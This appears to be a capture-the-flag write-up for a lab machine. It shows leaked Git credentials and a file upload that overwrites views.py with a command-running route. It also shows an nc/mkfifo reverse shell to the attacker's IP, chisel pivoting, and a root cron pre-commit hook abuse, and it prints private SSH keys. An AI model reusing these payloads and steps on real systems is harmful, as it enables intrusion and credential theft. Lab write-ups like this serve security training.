
![image](https://user-images.githubusercontent.com/105310322/192879606-715b15ea-2054-4b1c-b4da-8abea5567f71.png)


### Tools: Feroxbuster, php

### Vulnerabilities: PHP, GIT Pre-commit Cron Job

nmap finds a webpage and a port 3000 open. Lets checkout the webpage first and run feroxbuster.

```console
└─$ nmap -A -p- -T4 -Pn 10.129.59.80
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 11:39 CDT
Nmap scan report for 10.129.59.80
Host is up (0.030s latency).
Not shown: 65296 closed tcp ports (conn-refused), 237 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Wed, 28 Sep 2022 16:39:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Wed, 28 Sep 2022 16:39:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=9/28%Time=633478D3%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1573,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
SF:ython/3\.10\.3\r\nDate:\x20Wed,\x2028\x20Sep\x202022\x2016:39:48\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:5316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20
SF:\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=
SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\
SF:n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!
SF:</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jque
SF:ry-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stat
SF:ic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script
SF:\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\
SF:x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround
SF:\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
SF:=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boo
SF:tstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20
SF:\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Wed,\x2028\
SF:x20Sep\x202022\x2016:39:48\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length:\x20
SF:0\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTM
SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
SF::\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20req
SF:uest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20
SF:\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.36 seconds
```

The main webpage gives us a file to download and an upload page to visit.

With file uploads maybe we can create a reverse shell but more on that later.


feroxbuster found a console page and led me down a small rabbit hole of changing the werkzeug pin as well as a possible SSTI.

```console
└─$ feroxbuster -u http://10.129.59.80/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
200      GET       40l       81w     1360c http://10.129.59.80/
308      GET        5l       22w      243c http://10.129.59.80/uploads => http://10.129.59.80/uploads/
200      GET       45l      144w     1563c http://10.129.59.80/console
```

The downloaded files give us the sourcecode for how the webpage is ran. It also has a hidden .git folder which usually has some goodies in it.

From the .git we run git branch to find the directories. Public was uninteresting. Dev was hiding some credentials ```http://dev01:Soulless_Developer#2022@10.10.10.128:5187/``` in its updated file ```a76f8f75f7a4a12b706b0cf9c983796fa1985820```

However I was unable to use these with SSH. So we can save it for later. 

This same commit also shows views.py was changed.

```console
└─$ git log                                                 
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
                                                                                                 
└─$ git branch    
  dev
* public
                                                                                                 
└─$ git log public
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
                                                                                                 
└─$ git log dev   
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
                                                                                                 
                                                                                                 
└─$ git show a76f8f75f7a4a12b706b0cf9c983796fa1985820       
commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
diff --git a/app/app/views.py b/app/app/views.py
index f2744c6..0f3cc37 100644
--- a/app/app/views.py
+++ b/app/app/views.py
@@ -6,7 +6,17 @@ from flask import render_template, request, send_file
 from app import app
 
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+
+@app.route('/download')
+def download():
+    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
+
+
+@app.route('/upcloud', methods=['GET', 'POST'])
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
@@ -20,4 +30,4 @@ def upload_file():
 @app.route('/uploads/<path:path>')
 def send_report(path):
     path = get_file_name(path)
-    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
\ No newline at end of file
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
              
```


From our the downloaded source file we can find the views.py in /app/app/views.py. Our next step is going to be to edit the script with a reverse shell and upload it to the webpage.

We are going to add below ```@app.route('/uploads/')``` our own @app.route but for a shell.

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/shell')
def cmd():
    return os.system(request.args.get('cmd'))
```

Next we want to capture the file upload in burpsuite and change the filename to ```filename="/app/app/views.py"``` so it overwrites the original file.

```
POST / HTTP/1.1
Host: 10.129.59.80
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------163374653417435939443851688529
Content-Length: 998
Origin: http://10.129.59.80
Connection: close
Referer: http://10.129.59.80/
Upgrade-Insecure-Requests: 1

-----------------------------163374653417435939443851688529
Content-Disposition: form-data; name="file"; filename="/app/app/views.py"
Content-Type: text/x-python

import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/shell')
def cmd():
    return os.system(request.args.get('cmd'))
```

Finally we are going to capture the reverse shell with curl


```console
└─$ curl 'http://10.129.59.80/shell?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.10.16.10%201234%20>/tmp/f'
```
If you did everything correctly you will be connected, but something is off. We are already root but there are no flags :/

In a turn of events that which we did not see coming we have been trapped in something dark and twisted....A container

Pretty much this is not the real host. Remember that port 3000 we found awhile back? Thats what we are going to use in tandem with the IP listed below.

```console
└─$ nc -lvnp 1234         
listening on [any] 1234 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.59.80] 44869
/bin/sh: can't access tty; job control turned off
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/app # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:04  
          inet addr:172.17.0.4  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1581526 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1378463 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:129138727 (123.1 MiB)  TX bytes:702526213 (669.9 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

/app # 
```

Set up chisel on your host and then transfer a chisel from github to the victim machine.

I used linux_amd64

https://github.com/jpillora/chisel/releases

```console
└─$ chisel server --reverse --port 1235
2022/09/28 12:56:55 server: Reverse tunnelling enabled
2022/09/28 12:56:55 server: Fingerprint IB4SYWjs+ZoSz0EbcEqeidyUQzC2u4ZFaK0b33bw8/Q=
2022/09/28 12:56:55 server: Listening on http://0.0.0.0:1235
```

```console
/tmp # wget http://10.10.16.10:8000/chisel2
Connecting to 10.10.16.10:8000 (10.10.16.10:8000)
saving to 'chisel2'
chisel2                0% |                                | 37044  0:03:38 ETA
chisel2               13% |****                            | 1036k  0:00:13 ETA
chisel2               70% |**********************          | 5543k  0:00:01 ETA
chisel2              100% |********************************| 7888k  0:00:00 ETA
'chisel2' saved
```

Then launch chisel from the victim.

Note: Be sure to change to victim IP to 172.17.0.1 (My ifconfig says 172.17.0.4) since you want to 1st IP on the container.

```console
/tmp # ./chisel2 client 10.10.16.10:1235 R:3000:172.17.0.1:3000
2022/09/28 17:45:59 client: Connecting to ws://10.10.16.10:1235
2022/09/28 17:46:00 client: Connected (Latency 30.852349ms)
```

Now we can navigate to http://localhost:3000 and we get a gitea page.

![image](https://user-images.githubusercontent.com/105310322/192855531-f9c67260-c0e6-49b5-ba14-2fd2b1bbc01f.png)

Next we can find a login page and use the credentials found earlier in the .git files to login

Username:Dev01
Password:Soulless_Developer#2022

![image](https://user-images.githubusercontent.com/105310322/192855746-a5fe127e-5ec6-474e-a9fb-995fc8f0c9bd.png)

Then we can navigate through their files and nab the ssh key!

```console
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAqdAaA6cYgiwKTg/6SENSbTBgvQWS6UKZdjrTGzmGSGZKoZ0l
xfb28RAiN7+yfT43HdnsDNJPyo3U1YRqnC83JUJcZ9eImcdtX4fFIEfZ8OUouu6R
u2TPqjGvyVZDj3OLRMmNTR/OUmzQjpNIGyrIjDdvm1/Hkky/CfyXUucFnshJr/BL
7FU4L6ihII7zNEjaM1/d7xJ/0M88NhS1X4szT6txiB6oBMQGGolDlDJXqA0BN6cF
wEza2LLTiogLkCpST2orKIMGZvr4VS/xw6v5CDlyNaMGpvlo+88ZdvNiKLnkYrkE
WM+N+2c1V1fbWxBp2ImEhAvvgANx6AsNZxZFuupHW953npuL47RSn5RTsFXOaKiU
rzJZvoIc7h/9Jh0Er8QLcWvMRV+5hjQLZXTcey2dn7S0OQnO2n3vb5FWtJeWVVaN
O/cZWqNApc2n65HSdX+JY+wznGU6oh9iUpcXplRWNH321s9WKVII2Ne2xHEmE/ok
Nk+ZgGMFvD09RIB62t5YWF+yitMDx2E+XSg7bob3EO61zOlvjtY2cgvO6kmn1E5a
FX5S6sjxxncq4cj1NpWQRjxzu63SlP5i+3N3QPAH2UsVTVcbsWqr9jbl/5h4enkN
W0xav8MWtbCnAsmhuBzsLML0+ootNpbagxSmIiPPV1p/oHLRsRnJ4jaqoBECAwEA
AQKCAgEAkXmFz7tGc73m1hk6AM4rvv7C4Sv1P3+emHqsf5Y4Q63eIbXOtllsE/gO
WFQRRNoXvasDXbiOQqhevMxDyKlqRLElGJC8pYEDYeOeLJlhS84Fpp7amf8zKEqI
naMZHbuOg89nDbtBtbsisAHcs+ljBTw4kJLtFZhJ0PRjbtIbLnvHJMJnSH95Mtrz
rkDIePIwe/KU3kqq1Oe0XWBAQSmvO4FUMZiRuAN2dyVAj6TRE1aQxGyBsMwmb55D
O1pxDYA0I3SApKQax/4Y4GHCbC7XmQQdo3WWLVVdattwpUa7wMf/r9NwteSZbdZt
C/ZoJQtaofatX7IZ60EIRBGz2axq7t+IEDwSAQp3MyvNVK4h83GifVb/C9+G3XbM
BmUKlFq/g20D225vnORXXsPVdKzbijSkvupLZpsHyygFIj8mdg2Lj4UZFDtqvNSr
ajlFENjzJ2mXKvRXvpcJ6jDKK+ne8AwvbLHGgB0lZ8WrkpvKU6C/ird2jEUzUYX7
rw/JH7EjyjUF/bBlw1pkJxB1HkmzzhgmwIAMvnX16FGfl7b3maZcvwrfahbK++Dd
bD64rF+ct0knQQw6eeXwDbKSRuBPa5YHPHfLiaRknU2g++mhukE4fqcdisb2OY6s
futu9PMHBpyHWOzO4rJ3qX5mpexlbUgqeQHvsrAJRISAXi0md0ECggEBAOG4pqAP
IbL0RgydFHwzj1aJ/+L3Von1jKipr6Qlj/umynfUSIymHhhikac7awCqbibOkT4h
XJkJGiwjAe4AI6/LUOLLUICZ+B6vo+UHP4ZrNjEK3BgP0JC4DJ5X/S2JUfxSyOK+
Hh/CwZ9/6/8PtLhe7J+s7RYuketMQDl3MOp+MUdf+CyizXgYxdDqBOo67t4DxNqs
ttnakRXotUkFAnWWpCKD+RjkBkROEssQlzrMquA2XmBAlvis+yHfXaFj3j0coKAa
Ent6NIs/B8a/VRMiYK5dCgIDVI9p+Q7EmBL3HPJ+29A6Eg3OG50FwfPfcvxtxjYw
Fq338ppt+Co0wd8CggEBAMCXiWD6jrnKVJz7gVbDip64aa1WRlo+auk8+mlhSHtN
j+IISKtyRF6qeZHBDoGLm5SQzzcg5p/7WFvwISlRN3GrzlD92LFgj2NVjdDGRVUk
kIVKRh3P9Q4tzewxFoGnmYcSaJwVHFN7KVfWEvfkM1iucUxOj1qKkD1yLyP7jhqa
jxEYrr4+j1HWWmb7Mvep3X+1ZES1jyd9zJ4yji9+wkQGOGFkfzjoRyws3vPLmEmv
VeniuSclLlX3xL9CWfXeOEl8UWd2FHvZN8YeK06s4tQwPM/iy0BE4sDQyae7BO6R
idvvvD8UInqlc+F2n1X7UFKuYizOiDz0D2pAsJI9PA8CggEBAI/jNoyXuMKsBq9p
vrJB5+ChjbXwN4EwP18Q9D8uFq+zriNe9nR6PHsM8o5pSReejSM90MaLW8zOSZnT
IxrFifo5IDHCq2mfPNTK4C5SRYN5eo0ewBiylCB8wsZ5jpHllJbFavtneCqE6wqy
8AyixXA2Sp6rDGN0gl49OD+ppEwG74DxQ3GowlQJbqhzVXi+4qAyRN2k9dbABnax
5kZK5DtzMOQzvqnISdpm7oH17IF2EINnBRhUdCjHlDsOeVA1KmlIg3grxpZh23bc
Uie2thPBeWINOyD3YIMfab2pQsvsLM7EYXlGW1XjiiS5k97TFSinDZBjbUGu6j7Z
VTYKdX8CggEAUsAJsBiYQK314ymRbjVAl2gHSAoc2mOdTi/8LFE3cntmCimjB79m
LwKyj3TTBch1hcUes8I4NZ8qXP51USprVzUJxfT8KWKi2XyGHaFDYwz957d9Hwwe
cAQwSX7h+72GkunO9tl/PUNbBTmfFtH/WehCGBZdM/r7dNtd8+j/KuEj/aWMV4PL
0s72Mu9V++IJoPjQZ1FXfBFqXMK+Ixwk3lOJ4BbtLwdmpU12Umw1N9vVX1QiV/Z6
zUdTSxZ4TtM3fiOjWn/61ygC9eY6l2hjYeaECpKY4Dl48H4FV0NdICB6inycdsHw
+p+ihcqRNcFwxsXUuwnWsdHv2aiH9Z3H8wKCAQAlbliq7YW45VyYjg5LENGmJ8f0
gEUu7u8Im+rY+yfW6LqItUgCs1zIaKvXkRhOd7suREmKX1/HH3GztAbmYsURwIf/
nf4P67EmSRl46EK6ynZ8oHW5bIUVoiVV9SPOZv+hxwZ5LQNK3o7tuRyA6EYgEQll
o5tZ7zb7XTokw+6uF+mQriJqJYjhfJ2oXLjpufS+id3uYsLKnAXX06y4lWqaz72M
NfYDE7uwRhS1PwQyrMbaurAoI1Dq5n5nl6opIVdc7VlFPfoSjzixpWiVLZFoEbFB
AE77E1AeujKjRkXLQUO3z0E9fnrOl5dXeh2aJp1f+1Wq2Klti3LTLFkKY4og
-----END RSA PRIVATE KEY-----

```

We get a successful login and grab the user flag :)

```console
└─$ ssh dev01@10.129.59.80 -i id_rsa
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 28 18:05:32 UTC 2022

  System load:  0.1               Processes:              228
  Usage of /:   76.7% of 3.48GB   Users logged in:        0
  Memory usage: 22%               IP address for eth0:    10.129.59.80
  Swap usage:   0%                IP address for docker0: 172.17.0.1


16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
dev01@opensource:~$ 
```
```console
dev01@opensource:~$ cat user.txt
0e06****************************
```

I transferred over linpeas and pspy as per SOP and found that root was running a pre-commit over a cron job about every minute.

```console
/09/28 18:49:01 CMD: UID=0    PID=11820  | git status --porcelain 
2022/09/28 18:49:01 CMD: UID=???  PID=11821  | ???
2022/09/28 18:49:01 CMD: UID=0    PID=11822  | git add . 
2022/09/28 18:49:01 CMD: UID=0    PID=11823  | git commit -m Backup for 2022-09-28 
2022/09/28 18:49:01 CMD: UID=0    PID=11824  | git push origin main 
2022/09/28 18:49:01 CMD: UID=0    PID=11825  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
```

GTFO has some good info on this but its not perfect so it needed a little editing.


https://gtfobins.github.io/gtfobins/git/

I took a gamble and attempted to get the root ssh keys even though I couldnt confirm they were actually available.


```console
dev01@opensource:~$ echo "cp /root/.ssh/id_rsa /dev/shm && chmod 777 /dev/shm/id_rsa" >> /home/dev01/.git/hooks/pre-commit
```
But it worked and I got the key and flag!

```console
dev01@opensource:~$ cat /dev/shm/id_rsa
-----BEGIN RSA PRIVATE KEY-----
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
